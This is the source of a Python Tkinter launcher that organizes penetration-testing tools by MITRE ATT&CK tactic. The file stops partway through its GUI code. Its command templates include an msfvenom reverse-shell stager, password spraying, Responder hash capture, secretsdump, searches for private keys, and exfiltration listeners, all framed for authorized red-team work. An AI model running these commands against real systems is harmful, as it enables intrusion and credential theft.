#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATT&CK Lifecycle Toolkit  (attack_lifecycle_toolkit_v1.1.0.py)  v1.1.0

A single-file Tkinter control panel that organizes the tooling shipped with
Parrot OS / Kali by MITRE ATT&CK (Enterprise) tactic. For each tactic it lists
curated, best-in-class tools, shows whether each is installed, resolves a
command template against your engagement variables (target, LHOST, LPORT,
interface, wordlist, output dir), and launches the selected tool in an
interactive terminal window.

This is a *launcher and reference*, not an exploitation framework. It runs the
standard, publicly documented security tools already present on the system.
It contains no exploit payloads, malware, or destructive tooling.

INTENDED USE
    Authorized penetration testing, red-team engagements, and OSCP-style lab
    practice ONLY. You are responsible for holding written authorization for
    every host you touch. The app enforces an authorization acknowledgement
    on startup; that acknowledgement is not a substitute for a signed
    scope/RoE document.

DEPENDENCIES
    Python 3.8+ standard library only (tkinter). No third-party packages.

USAGE
    python3 attack_lifecycle_toolkit_v1.1.0.py

CHANGELOG
    v1.1.0  - Required-field validation is now derived from every {placeholder}
               actually present in a tool's command template (not just its
               manually-maintained `needs` tuple). v1.0.0 had ~12 tools whose
               template referenced {out} (or similar) without declaring it in
               `needs`, so that field was silently never validated before
               being used to build a path / create a directory.
             - The output directory is only created when the selected tool's
               template actually uses {out}; previously every launch -
               including "sudo -l" and "crontab -l" - was blocked if the loot
               directory couldn't be created, even though they never touch it.
             - LHOST now prefers a tun/tap VPN interface's address over the
               OS default route (OSCP/PWK-style labs route over a VPN; the
               default-route IP is usually the wrong, non-routable one).
             - Responder's interface is now a GUI field (auto-filled from the
               default-route interface name) instead of a hardcoded "eth0",
               which silently fails on most modern installs.
             - Command preview now live-updates as engagement variables are
               edited (previously stale until you reselected the tool) and
               flags any still-missing required field inline.
             - Tool selection / detail pane now survives a tools rescan
               instead of being wiped.
             - Target/path character allowlists widened to permit URL query
               strings and CIDR lists (sqlmap/whatweb targets were previously
               rejected); still blocks shell metacharacters and, importantly,
               control characters (terminal-escape-sequence injection is a
               separate risk from shell injection and is not mitigated by
               shlex.quote alone).
             - Launched processes are detached into their own session so
               closing the GUI, or Ctrl+C in whatever shell launched it,
               cannot take down an active listener/handler with it.
             - webbrowser.open() / clipboard calls no longer crash the app
               if no browser or clipboard manager is available.
             - Install hints distinguish apt-installable tools from
               pipx/source/manual-download ones instead of guessing.
    v1.0.0  - Initial release.

AUTHOR NOTES
    - No shell=True anywhere. User-supplied values are shell-quoted before
      substitution; the command templates themselves are trusted (authored
      here), so injection via input fields is contained independently of the
      character-allowlist validation (which exists for UX and for blocking
      control-character/terminal-escape injection, see CHANGELOG).
    - Tool detection is via shutil.which(), run once in a daemon thread.
    - No network egress is performed by the app itself (the LHOST helper uses
      a UDP socket that only reads the kernel's routing choice; nothing is
      sent).
"""

from __future__ import annotations

import os
import re
import shlex
import shutil
import socket
import subprocess
import threading
import webbrowser
from dataclasses import dataclass, field
from datetime import datetime
from typing import Callable, Dict, List, Optional, Set

import tkinter as tk
from tkinter import ttk, messagebox

APP_NAME = "ATT&CK Lifecycle Toolkit"
APP_VERSION = "v1.1.0"

# --------------------------------------------------------------------------- #
# Terminal emulator detection                                                 #
# --------------------------------------------------------------------------- #
# Each entry: (binary_name, builder). The builder receives the already-wrapped
# inner command string and returns a full argv list. `-e`/`--`/`-x` semantics
# differ between emulators, so each is handled explicitly. Ordered by Parrot/
# Kali likelihood. x-terminal-emulator (the Debian alternatives symlink) is the
# last-resort fallback: Debian Policy 11.8.3 requires it to accept `-e` taking
# the remaining argv verbatim (xterm-style), which is why it is NOT given a
# single shlex-quoted string the way qterminal/xfce4-terminal are.
_TERMINALS: List[tuple] = [
    ("qterminal",          lambda w: ["qterminal", "-e", f"bash -lc {shlex.quote(w)}"]),
    ("mate-terminal",      lambda w: ["mate-terminal", "--", "bash", "-lc", w]),
    ("gnome-terminal",     lambda w: ["gnome-terminal", "--", "bash", "-lc", w]),
    ("xfce4-terminal",     lambda w: ["xfce4-terminal", "-e", f"bash -lc {shlex.quote(w)}"]),
    ("konsole",            lambda w: ["konsole", "-e", "bash", "-lc", w]),
    ("tilix",              lambda w: ["tilix", "--", "bash", "-lc", w]),
    ("alacritty",          lambda w: ["alacritty", "-e", "bash", "-lc", w]),
    ("kitty",              lambda w: ["kitty", "bash", "-lc", w]),
    ("lxterminal",         lambda w: ["lxterminal", "-e", f"bash -lc {shlex.quote(w)}"]),
    ("terminator",         lambda w: ["terminator", "-e", f"bash -lc {shlex.quote(w)}"]),
    ("xterm",              lambda w: ["xterm", "-hold", "-e", "bash", "-lc", w]),
    ("x-terminal-emulator", lambda w: ["x-terminal-emulator", "-e", "bash", "-lc", w]),
]


def detect_terminal() -> Optional[Callable[[str], List[str]]]:
    """Return the argv builder for the first available terminal emulator."""
    for binary, builder in _TERMINALS:
        if shutil.which(binary):
            return builder
    return None


def primary_ip() -> str:
    """Best-effort local IP the OS would use for outbound traffic (default route).

    Connects a UDP socket to a TEST-NET-3 address (RFC 5737). UDP connect only
    sets the socket's peer for routing purposes; no packet leaves the host.
    This is used as the fallback for detect_lhost() below; prefer that
    function over calling this one directly, since on a VPN-routed lab
    (OSCP/PWK-style) the default route is usually NOT the right LHOST.
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("203.0.113.1", 9))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        if s is not None:
            s.close()


def _iface_ipv4(ifname: str) -> Optional[str]:
    """IPv4 address currently bound to `ifname` via SIOCGIFADDR. POSIX-only;
    returns None rather than raising on any failure (missing fcntl, no such
    interface, interface has no IPv4 address, etc.)."""
    try:
        import fcntl
        import struct
    except ImportError:
        return None
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        packed = struct.pack("256s", ifname[:15].encode("ascii", "ignore"))
        raw = fcntl.ioctl(sock.fileno(), 0x8915, packed)  # SIOCGIFADDR
        return socket.inet_ntoa(raw[20:24])
    except OSError:
        return None
    finally:
        sock.close()


def detect_lhost() -> str:
    """Best LHOST guess for reverse shells/listeners.                       # NEW in v1.1.0

    OSCP/PWK-style labs route the exam/lab network over a VPN (tun0/tap0),
    which is almost always the address a target can actually call back to,
    and is NOT what the OS picks as its default route (that's usually the
    student's home/NAT interface, which the lab network can't reach). Prefer
    a tun/tap interface's address; fall back to the default-route IP, then
    loopback.
    """
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if name.startswith(("tun", "tap")):
                ip = _iface_ipv4(name)
                if ip:
                    return ip
    except OSError:
        pass
    return primary_ip()


def default_lan_iface() -> Optional[str]:
    """Interface name backing the default route (0.0.0.0/0), from            # NEW in v1.1.0
    /proc/net/route. Used to pre-fill the Responder/LLMNR interface field
    instead of a hardcoded 'eth0', which is frequently wrong on current
    hardware (wlan0, enp3s0, ens33, ...). Returns None on any failure so the
    GUI field is just left blank rather than guessing.
    """
    try:
        with open("/proc/net/route", "r", encoding="ascii", errors="replace") as fh:
            next(fh, None)  # header line
            for line in fh:
                fields = line.split()
                if len(fields) >= 2 and fields[1] == "00000000":
                    return fields[0]
    except OSError:
        pass
    return None


# --------------------------------------------------------------------------- #
# Data model                                                                  #
# --------------------------------------------------------------------------- #
@dataclass(frozen=True)
class Tool:
    name: str                       # human-readable label
    binary: Optional[str]           # executable to detect/launch (None = reference-only)
    desc: str                       # what it is / when to use it
    cmd: Optional[str] = None       # command template with {placeholders}
    needs: tuple = ()               # EXTRA required placeholders beyond what {braces}
                                     # in `cmd` already imply (see required_fields()) -
                                     # kept mainly for reference-only tools and clarity
    pkg: Optional[str] = None       # apt package for the install hint
    install: Optional[str] = None   # NEW: free-text install hint, takes priority over
                                     # `pkg` when the tool isn't a clean apt install
                                     # (pipx, go install, manual download, etc.)
    url: Optional[str] = None       # docs / GTFOBins / cheat-sheet link


@dataclass(frozen=True)
class Tactic:
    tid: str                        # MITRE tactic ID, e.g. TA0043
    name: str
    desc: str
    tools: List[Tool] = field(default_factory=list)


# Curated tooling per Enterprise tactic. Commands are conventional, publicly
# documented invocations. Reference-only entries (binary=None) exist where the
# capability is a framework module or a knowledge resource rather than a
# standalone binary.
TACTICS: List[Tactic] = [
    Tactic("TA0043", "Reconnaissance",
           "Passive/active information gathering on in-scope targets.",
           [
               Tool("Nmap (service/version)", "nmap",
                    "Default scripts + version detection, greppable output saved to loot.",
                    "nmap -sC -sV -oA {out}/nmap_initial {target}",
                    needs=("target",), pkg="nmap", url="https://nmap.org/book/man.html"),
               Tool("Nmap (full TCP)", "nmap",
                    "All 65535 TCP ports, then targeted service scan.",
                    "nmap -p- --min-rate 2000 -oA {out}/nmap_allports {target}",
                    needs=("target",), pkg="nmap"),
               Tool("Masscan", "masscan",
                    "Very fast port sweep for large ranges (rate-limit responsibly; "
                    "needs root/cap_net_raw for raw sockets).",
                    "masscan {target} -p1-65535 --rate 1000 -oL {out}/masscan.txt",
                    needs=("target",), pkg="masscan"),
               Tool("theHarvester", "theHarvester",
                    "OSINT: emails, subdomains, and hosts from public sources.",
                    "theHarvester -d {target} -b all",
                    needs=("target",), pkg="theharvester"),
               Tool("dnsrecon", "dnsrecon",
                    "DNS enumeration incl. zone transfer and brute forcing.",
                    "dnsrecon -d {target}",
                    needs=("target",), pkg="dnsrecon"),
               Tool("Amass (passive)", "amass",
                    "Subdomain discovery via passive sources.",
                    "amass enum -passive -d {target} -o {out}/amass.txt",
                    needs=("target",), pkg="amass"),
               Tool("WhatWeb", "whatweb",
                    "Fingerprint web technologies on an HTTP(S) target.",
                    "whatweb -a 3 {target}",
                    needs=("target",), pkg="whatweb"),
               Tool("Spiderfoot", "spiderfoot",
                    "OSINT automation web UI (bind locally, then browse).",
                    "spiderfoot -l 127.0.0.1:5001",
                    pkg="spiderfoot"),
           ]),

    Tactic("TA0042", "Resource Development",
           "Standing up attacker-controlled infrastructure and payloads for the engagement.",
           [
               Tool("msfvenom (payload gen)", "msfvenom",
                    "Generate a stager for authorized testing. Change payload/format to suit.",
                    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {out}/stager.elf",
                    needs=("lhost", "lport"), pkg="metasploit-framework"),
               Tool("Gophish", "gophish",
                    "Phishing simulation platform for authorized social-engineering tests.",
                    "gophish",
                    pkg="gophish", url="https://getgophish.com/documentation/"),
               Tool("SET (Social-Engineer Toolkit)", "setoolkit",
                    "Menu-driven SE payload/campaign builder. Authorized use only.",
                    "setoolkit",
                    pkg="set"),
               Tool("Python HTTP delivery server", "python3",
                    "Serve payloads/tools from your box over HTTP for retrieval on target.",
                    "python3 -m http.server 8000 --directory {out}",
                    pkg="python3"),
           ]),

    Tactic("TA0001", "Initial Access",
           "Techniques to get the first foothold in scope.",
           [
               Tool("searchsploit", "searchsploit",
                    "Search the local Exploit-DB copy for a matched service/version.",
                    "searchsploit {target}",
                    needs=("target",), pkg="exploitdb"),
               Tool("Metasploit console", "msfconsole",
                    "Load a vetted module against an authorized target.",
                    "msfconsole -q",
                    pkg="metasploit-framework"),
               Tool("sqlmap", "sqlmap",
                    "Automated SQL injection testing against an authorized URL.",
                    "sqlmap -u {target} --batch --banner",
                    needs=("target",), pkg="sqlmap"),
               Tool("Hydra (auth spray)", "hydra",
                    "Online password guessing against a login service in scope.",
                    "hydra -L {out}/users.txt -P {wordlist} {target} ssh",
                    needs=("target", "wordlist"), pkg="hydra"),
               Tool("BeEF", "beef-xss",
                    "Browser Exploitation Framework for authorized client-side testing.",
                    "beef-xss",
                    pkg="beef-xss"),
           ]),

    Tactic("TA0002", "Execution",
           "Running attacker-controlled code on a compromised host.",
           [
               Tool("NetExec (nxc)", "nxc",
                    "Successor to CrackMapExec: remote command exec across SMB/WinRM/SSH.",
                    "nxc smb {target} -u USER -p PASS -x whoami",
                    needs=("target",),
                    install="pipx install netexec   (or: pip install --user netexec)",
                    url="https://www.netexec.wiki/"),
               Tool("CrackMapExec", "crackmapexec",
                    "Remote exec / enumeration across a subnet (if nxc unavailable).",
                    "crackmapexec smb {target}",
                    needs=("target",), pkg="crackmapexec"),
               Tool("impacket-psexec", "impacket-psexec",
                    "Semi-interactive shell via SMB (requires valid creds).",
                    "impacket-psexec DOMAIN/USER@{target}",
                    needs=("target",), pkg="python3-impacket"),
               Tool("evil-winrm", "evil-winrm",
                    "Interactive WinRM shell for Windows targets with creds.",
                    "evil-winrm -i {target} -u USER -p PASS",
                    needs=("target",), pkg="evil-winrm"),
               Tool("Sliver (C2)", "sliver-server",
                    "Modern adversary-emulation C2 for authorized red teams.",
                    "sliver-server",
                    install="Download the Linux release from "
                            "https://github.com/BishopFox/sliver/releases",
                    url="https://sliver.sh/docs"),
           ]),

    Tactic("TA0003", "Persistence",
           "Maintaining access. On engagements, document every mechanism and remove it during cleanup.",
           [
               Tool("Meterpreter persistence", None,
                    "Use Metasploit post/persistence modules; log the artifact for cleanup.",
                    url="https://docs.metasploit.com/"),
               Tool("SharPersist (Windows)", None,
                    "Reference: Windows persistence toolkit (scheduled tasks, services, run keys)."),
               Tool("crontab (Linux)", "crontab",
                    "Inspect existing cron for legitimate persistence review.",
                    "crontab -l",
                    pkg="cron"),
               Tool("PowerSploit / Empire modules", None,
                    "Framework-provided persistence; prefer over ad-hoc scripts for auditability."),
           ]),

    Tactic("TA0004", "Privilege Escalation",
           "Gaining higher privileges on a foothold host.",
           [
               Tool("linPEAS", "linpeas.sh",
                    "PEASS-ng Linux enumeration script. If missing, fetch from your HTTP server.",
                    "linpeas.sh | tee {out}/linpeas.txt",
                    install="Download from the release URL below, chmod +x, then run it by "
                            "full path or place it on PATH as linpeas.sh.",
                    url="https://github.com/peass-ng/PEASS-ng"),
               Tool("winPEAS", None,
                    "PEASS-ng Windows enumeration (winpeas.exe/.bat). Reference resource.",
                    url="https://github.com/peass-ng/PEASS-ng"),
               Tool("linux-exploit-suggester", "linux-exploit-suggester.sh",
                    "Map running kernel/userland against known local privesc exploits.",
                    "linux-exploit-suggester.sh",
                    install="Download, chmod +x, then run by full path or place on PATH."),
               Tool("pspy", None,
                    "Watch processes/cron without root to spot exploitable jobs.",
                    url="https://github.com/DominicBreuker/pspy"),
               Tool("GTFOBins", None,
                    "Reference for abusing legit binaries with SUID/sudo rights.",
                    url="https://gtfobins.github.io/"),
               Tool("sudo -l", "sudo",
                    "List the current user's sudo rights (fast, high-signal check).",
                    "sudo -l",
                    pkg="sudo"),
           ]),

    Tactic("TA0005", "Defense Evasion",
           "Avoiding detection. Keep evasion proportional to the RoE.",
           [
               Tool("proxychains", "proxychains4",
                    "Route a tool's traffic through a SOCKS pivot.",
                    "proxychains4 nmap -sT -Pn {target}",
                    needs=("target",), pkg="proxychains4"),
               Tool("msfvenom encoders", "msfvenom",
                    "List available encoders for AV/detection testing.",
                    "msfvenom --list encoders",
                    pkg="metasploit-framework"),
               Tool("Veil", "veil",
                    "Payload generation framework focused on AV evasion testing.",
                    "veil",
                    pkg="veil"),
               Tool("Invoke-Obfuscation", None,
                    "Reference: PowerShell obfuscation for detection-engineering tests."),
           ]),

    Tactic("TA0006", "Credential Access",
           "Obtaining account credentials.",
           [
               Tool("Hashcat", "hashcat",
                    "GPU-accelerated offline cracking. Set -m to the hash mode.",
                    "hashcat -m 0 {out}/hashes.txt {wordlist}",
                    needs=("wordlist",), pkg="hashcat"),
               Tool("John the Ripper", "john",
                    "CPU offline cracking with rules.",
                    "john --wordlist={wordlist} {out}/hashes.txt",
                    needs=("wordlist",), pkg="john"),
               Tool("Responder", "responder",
                    "Capture NetNTLM hashes via LLMNR/NBT-NS poisoning (authorized LANs "
                    "only). Set the interface field to your LAN-facing adapter, not a VPN "
                    "tunnel; needs root.",
                    "responder -I {iface}",
                    pkg="responder"),
               Tool("impacket-secretsdump", "impacket-secretsdump",
                    "Dump SAM/LSA/NTDS secrets with valid creds.",
                    "impacket-secretsdump DOMAIN/USER@{target}",
                    needs=("target",), pkg="python3-impacket"),
               Tool("hashid", "hashid",
                    "Identify a hash type before choosing a cracking mode.",
                    "hashid {out}/hashes.txt",
                    pkg="hashid"),
               Tool("Mimikatz (Windows)", None,
                    "Reference: in-memory credential extraction on Windows hosts."),
           ]),

    Tactic("TA0007", "Discovery",
           "Mapping the environment from inside.",
           [
               Tool("enum4linux-ng", "enum4linux-ng",
                    "Modern SMB/RPC enumeration for Windows/Samba hosts.",
                    "enum4linux-ng -A {target}",
                    needs=("target",),
                    install="Try: sudo apt install enum4linux-ng -- if unavailable in your "
                            "repos, see https://github.com/cddmp/enum4linux-ng"),
               Tool("smbclient", "smbclient",
                    "List and browse SMB shares.",
                    "smbclient -L //{target}/ -N",
                    needs=("target",), pkg="smbclient"),
               Tool("ldapsearch", "ldapsearch",
                    "Anonymous LDAP enumeration of a domain controller.",
                    "ldapsearch -x -H ldap://{target} -s base",
                    needs=("target",), pkg="ldap-utils"),
               Tool("BloodHound collector", "bloodhound-python",
                    "Collect AD relationships for graph analysis in BloodHound.",
                    "bloodhound-python -d DOMAIN -u USER -p PASS -c all -ns {target}",
                    needs=("target",), install="pipx install bloodhound"),
               Tool("snmpwalk", "snmpwalk",
                    "Walk SNMP with the public community string.",
                    "snmpwalk -v2c -c public {target}",
                    needs=("target",), pkg="snmp"),
           ]),

    Tactic("TA0008", "Lateral Movement",
           "Moving between hosts inside scope.",
           [
               Tool("evil-winrm", "evil-winrm",
                    "Pivot to another Windows host over WinRM with creds.",
                    "evil-winrm -i {target} -u USER -p PASS",
                    needs=("target",), pkg="evil-winrm"),
               Tool("xfreerdp", "xfreerdp",
                    "RDP into a target with credentials.",
                    "xfreerdp /v:{target} /u:USER /p:PASS +clipboard",
                    needs=("target",), pkg="freerdp2-x11"),
               Tool("impacket-wmiexec", "impacket-wmiexec",
                    "Command execution over WMI (quieter than psexec).",
                    "impacket-wmiexec DOMAIN/USER@{target}",
                    needs=("target",), pkg="python3-impacket"),
               Tool("Ligolo-ng", None,
                    "Reference: tunneling/pivoting via a TUN interface for clean routing.",
                    url="https://github.com/nicocha30/ligolo-ng"),
               Tool("chisel", "chisel",
                    "Fast TCP/UDP tunnel over HTTP for pivoting (run server on your box).",
                    "chisel server -p {lport} --reverse",
                    needs=("lport",),
                    install="Download a release from "
                            "https://github.com/jpillora/chisel/releases, or: "
                            "go install github.com/jpillora/chisel/cmd/chisel@latest"),
           ]),

    Tactic("TA0009", "Collection",
           "Gathering data of interest (only what the RoE permits).",
           [
               Tool("find (sensitive files)", "find",
                    "Locate common sensitive files on a Linux foothold.",
                    "find / -type f \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '*.conf' \\) 2>/dev/null",
                    pkg="findutils"),
               Tool("tar (stage archive)", "tar",
                    "Stage collected in-scope data into a single archive for review.",
                    "tar czf {out}/collection.tgz -C /path/to/scope .",
                    pkg="tar"),
               Tool("Framework collection modules", None,
                    "Prefer Metasploit/Empire collection post-modules for logged, auditable capture."),
           ]),

    Tactic("TA0011", "Command and Control",
           "Maintaining a comms channel with compromised hosts.",
           [
               Tool("Metasploit handler", "msfconsole",
                    "Multi/handler to catch a reverse session.",
                    "msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; run'",
                    needs=("lhost", "lport"), pkg="metasploit-framework"),
               Tool("ncat listener", "ncat",
                    "Simple encrypted reverse-shell catcher.",
                    "ncat -lvnp {lport} --ssl",
                    needs=("lport",), pkg="ncat"),
               Tool("socat listener", "socat",
                    "Upgrade to a fully interactive TTY listener.",
                    "socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
                    needs=("lport",), pkg="socat"),
               Tool("Sliver (C2)", "sliver-server",
                    "Session/beacon C2 with mTLS, DNS, and HTTP(S) channels.",
                    "sliver-server",
                    install="Download the Linux release from "
                            "https://github.com/BishopFox/sliver/releases",
                    url="https://sliver.sh/docs"),
               Tool("dnscat2", None,
                    "Reference: DNS-tunneled C2 for restrictive egress environments.",
                    url="https://github.com/iagox86/dnscat2"),
           ]),

    Tactic("TA0010", "Exfiltration",
           "Moving data out over a controlled channel. Only exfil authorized, minimized data.",
           [
               Tool("HTTP pull (server side)", "python3",
                    "Host a directory; retrieve staged data from the target over HTTP.",
                    "python3 -m http.server {lport} --directory {out}",
                    needs=("lport",), pkg="python3"),
               Tool("scp", "scp",
                    "Pull a staged archive off the target over SSH.",
                    "scp USER@{target}:/tmp/collection.tgz {out}/",
                    needs=("target",), pkg="openssh-client"),
               Tool("ncat transfer", "ncat",
                    "Receive a file over a raw TCP channel.",
                    "ncat -lvnp {lport} > {out}/exfil.bin",
                    needs=("lport",), pkg="ncat"),
               Tool("chisel tunnel", "chisel",
                    "Tunnel exfil through an existing pivot.",
                    "chisel server -p {lport} --reverse",
                    needs=("lport",),
                    install="Download a release from "
                            "https://github.com/jpillora/chisel/releases, or: "
                            "go install github.com/jpillora/chisel/cmd/chisel@latest"),
           ]),

    Tactic("TA0040", "Impact",
           "Destructive/availability techniques. Almost always OUT OF SCOPE unless a "
           "signed engagement explicitly authorizes them. This tool intentionally ships "
           "no destructive commands — demonstrate impact with a benign proof artifact "
           "and written approval.",
           [
               Tool("Benign proof-of-impact", "bash",
                    "Drop a harmless, clearly-labelled proof file to evidence write access "
                    "WITHOUT causing damage. Preferred over any destructive demonstration.",
                    "bash -c 'echo \"Authorized pentest proof-of-impact $(date -u)\" > {out}/PROOF_OF_ACCESS.txt'",
                    pkg="bash"),
               Tool("Controlled availability test", None,
                    "Any DoS/availability test (e.g. hping3, stress-ng) requires explicit, "
                    "separate written authorization, a maintenance window, and rollback plan. "
                    "Not launchable from here by design."),
               Tool("Data destruction / ransomware simulation", None,
                    "Not provided. Simulate only via tabletop or vendor-sanctioned tooling "
                    "under a specific signed statement of work."),
           ]),
]

# Fields the GUI exposes as engagement variables.
PLACEHOLDER_FIELDS = ["target", "lhost", "lport", "iface", "wordlist", "out"]

# --------------------------------------------------------------------------- #
# Input validation                                                           #
# --------------------------------------------------------------------------- #
# Defense-in-depth note: shell-metacharacter injection is already prevented
# UNCONDITIONALLY by shlex.quote() in resolve_command(), regardless of what
# these allowlists let through. Their actual job is twofold: (1) catch
# obviously malformed input early with a clear message, and (2) block control
# characters -- especially ESC (0x1b) -- that could be used for ANSI/
# terminal-escape-sequence injection once the resolved command line is
# rendered inside the spawned terminal. That second risk is NOT mitigated by
# shlex.quote, so these stay restrictive about *which bytes* are allowed even
# though v1.1.0 widened them to permit ordinary URL/CIDR punctuation.
_SAFE_VALUE_RE = re.compile(r"^[A-Za-z0-9_.:/@\[\]\-,+%?=&]+$")   # target/lhost/lport/iface
_PATH_RE = re.compile(r"^[A-Za-z0-9_.:/@\[\]\-~ ,+%]+$")          # wordlist/out

_PLACEHOLDER_RE = re.compile(r"\{(\w+)\}")


def extract_placeholders(template: str) -> Set[str]:
    """Every {name} placeholder actually referenced by a command template."""
    return set(_PLACEHOLDER_RE.findall(template))


def required_fields(tool: "Tool") -> tuple:
    """Fields that must be valid before `tool` can be launched.

    v1.1.0: this is the union of the tool's declared `needs` AND every
    {placeholder} its own template references, instead of trusting `needs`
    alone. In v1.0.0 roughly a dozen templates referenced {out} (tar, hashid,
    linPEAS, scp, msfvenom, Hydra, Hashcat/John, the proof-of-impact file,
    both HTTP delivery/exfil tools, ...) without listing "out" in `needs`, so
    validate_context() silently never checked it for those tools even though
    the resolved command depended on it.
    """
    if not tool.cmd:
        return tool.needs
    return tuple(sorted(set(tool.needs) | extract_placeholders(tool.cmd)))


# --------------------------------------------------------------------------- #
# Command resolution                                                          #
# --------------------------------------------------------------------------- #
def resolve_command(template: str, ctx: Dict[str, str]) -> str:
    """Substitute {placeholders} with shell-quoted context values.

    Paths (wordlist, out) are user-expanded first. Unknown placeholders are
    left as an empty quoted string rather than raising, so display never breaks.
    """
    def repl(match: "re.Match") -> str:
        key = match.group(1)
        val = ctx.get(key, "")
        if key in ("wordlist", "out"):
            val = os.path.expanduser(val)
        return shlex.quote(val)

    return _PLACEHOLDER_RE.sub(repl, template)


def validate_context(fields: tuple, ctx: Dict[str, str]) -> Optional[str]:
    """Return an error string if any required field is missing/invalid, else None."""
    for key in fields:
        raw = ctx.get(key, "").strip()
        if not raw:
            return f"This command needs the '{key}' field to be set."
        if key == "lport":
            if not raw.isdigit() or not (1 <= int(raw) <= 65535):
                return "LPORT must be an integer between 1 and 65535."
        elif key in ("wordlist", "out"):
            if not _PATH_RE.match(raw):
                return f"The '{key}' path contains unsupported characters."
        else:
            if not _SAFE_VALUE_RE.match(raw):
                return (f"The '{key}' value contains characters that are not allowed "
                        f"(no spaces, quotes, or shell metacharacters).")
    return None


# --------------------------------------------------------------------------- #
# GUI                                                                         #
# --------------------------------------------------------------------------- #
class ToolkitApp(ttk.Frame):
    def __init__(self, master: tk.Tk) -> None:
        super().__init__(master, padding=8)
        self.master = master
        self.pack(fill="both", expand=True)

        self._installed: Dict[str, bool] = {}
        self._installed_lock = threading.Lock()
        self._current_tools: List[Tool] = []
        self._selected_tool: Optional[Tool] = None
        self._selected_tool_iid: Optional[str] = None   # NEW: survives rescans

        self._build_vars()
        self._build_widgets()
        self._populate_tactics()
        self._scan_tools_async()

    # -- variable / field setup -------------------------------------------- #
    def _build_vars(self) -> None:
        default_out = os.path.join(
            os.path.expanduser("~"), "loot",
            datetime.now().strftime("%Y%m%d")
        )
        self.var_target = tk.StringVar()
        self.var_lhost = tk.StringVar(value=detect_lhost())          # CHANGED: VPN-aware
        self.var_lport = tk.StringVar(value="4444")
        self.var_iface = tk.StringVar(value=default_lan_iface() or "")  # NEW
        self.var_wordlist = tk.StringVar(value="/usr/share/wordlists/rockyou.txt")
        self.var_out = tk.StringVar(value=default_out)
        self.var_status = tk.StringVar(value="Scanning installed tools…")

        # NEW: keep the resolved-command preview in sync as fields change,
        # instead of only refreshing on tool (re)selection -- previously
        # "Copy command" could silently copy a stale command after an edit.
        for var in (self.var_target, self.var_lhost, self.var_lport,
                    self.var_iface, self.var_wordlist, self.var_out):
            var.trace_add("write", self._refresh_preview)

    def context(self) -> Dict[str, str]:
        return {
            "target": self.var_target.get().strip(),
            "lhost": self.var_lhost.get().strip(),
            "lport": self.var_lport.get().strip(),
            "iface": self.var_iface.get().strip(),
            "wordlist": self.var_wordlist.get().strip(),
            "out": self.var_out.get().strip(),
        }

    # -- widget construction ----------------------------------------------- #
    def _build_widgets(self) -> None:
        self.master.title(f"{APP_NAME} {APP_VERSION}")
        self.master.geometry("1080x740")
        self.master.minsize(900, 620)

        # Engagement variables bar
        top = ttk.LabelFrame(self, text="Engagement variables", padding=8)
        top.pack(fill="x", pady=(0, 8))
        fields = [
            ("Target (host/IP/CIDR/URL)", self.var_target, 26),
            ("LHOST", self.var_lhost, 16),
            ("LPORT", self.var_lport, 7),
        ]
        for col, (label, var, width) in enumerate(fields):
            ttk.Label(top, text=label).grid(row=0, column=col * 2, sticky="w", padx=(0, 4))
            ttk.Entry(top, textvariable=var, width=width).grid(
                row=0, column=col * 2 + 1, sticky="w", padx=(0, 12))
        ttk.Label(top, text="Wordlist").grid(row=1, column=0, sticky="w", pady=(6, 0))
        ttk.Entry(top, textvariable=self.var_wordlist, width=48).grid(
            row=1, column=1, columnspan=3, sticky="we", pady=(6, 0), padx=(0, 12))
        ttk.Label(top, text="Output dir").grid(row=1, column=4, sticky="w", pady=(6, 0))
        ttk.Entry(top, textvariable=self.var_out, width=28).grid(
            row=1, column=5, sticky="we", pady=(6, 0))
        # NEW: LAN interface field (Responder et al.) -- auto-filled from the
        # default route, editable since Responder specifically wants the LAN
        # adapter rather than a VPN tunnel.
        ttk.Label(top, text="Interface (LAN, e.g. eth0)").grid(
            row=2, column=0, sticky="w", pady=(6, 0))
        ttk.Entry(top, textvariable=self.var_iface, width=16).grid(
            row=2, column=1, sticky="w", pady=(6, 0), padx=(0, 12))
        top.columnconfigure(5, weight=1)

        # Main split: tactics list | tool detail
        paned = ttk.PanedWindow(self, orient="horizontal")
        paned.pack(fill="both", expand=True)

        # Left: tactics
        left = ttk.Frame(paned)
        ttk.Label(left, text="MITRE ATT&CK tactics", font=("TkDefaultFont", 10, "bold")
                  ).pack(anchor="w", pady=(0, 4))
        self.tactic_tree = ttk.Treeview(left, columns=("id",), show="tree", selectmode="browse")
        self.tactic_tree.column("#0", width=230, stretch=True)
        self.tactic_tree.pack(fill="both", expand=True)
        self.tactic_tree.bind("<<TreeviewSelect>>", self._on_tactic_select)
        paned.add(left, weight=1)

        # Right: tools + details
        right = ttk.Frame(paned)
        self.tactic_desc = ttk.Label(right, text="", wraplength=680, justify="left",
                                     foreground="#444")
        self.tactic_desc.pack(fill="x", pady=(0, 6))

        cols = ("status",)
        self.tool_tree = ttk.Treeview(right, columns=cols, show="tree headings",
                                      selectmode="browse", height=12)
        self.tool_tree.heading("#0", text="Tool")
        self.tool_tree.heading("status", text="Installed")
        self.tool_tree.column("#0", width=320, stretch=True)
        self.tool_tree.column("status", width=90, anchor="center", stretch=False)
        self.tool_tree.tag_configure("yes", foreground="#127a12")
        self.tool_tree.tag_configure("no", foreground="#b00020")
        self.tool_tree.tag_configure("ref", foreground="#555")
        self.tool_tree.pack(fill="both", expand=True)
        self.tool_tree.bind("<<TreeviewSelect>>", self._on_tool_select)

        detail = ttk.LabelFrame(right, text="Details", padding=8)
        detail.pack(fill="x", pady=(6, 0))
        self.detail_desc = ttk.Label(detail, text="Select a tool.", wraplength=680,
                                     justify="left")
        self.detail_desc.pack(fill="x", anchor="w")

        ttk.Label(detail, text="Resolved command:", font=("TkDefaultFont", 9, "bold")
                  ).pack(anchor="w", pady=(6, 0))
        self.cmd_text = tk.Text(detail, height=4, wrap="word", relief="solid", borderwidth=1)
        self.cmd_text.configure(state="disabled", background="#f6f6f6")
        self.cmd_text.pack(fill="x")

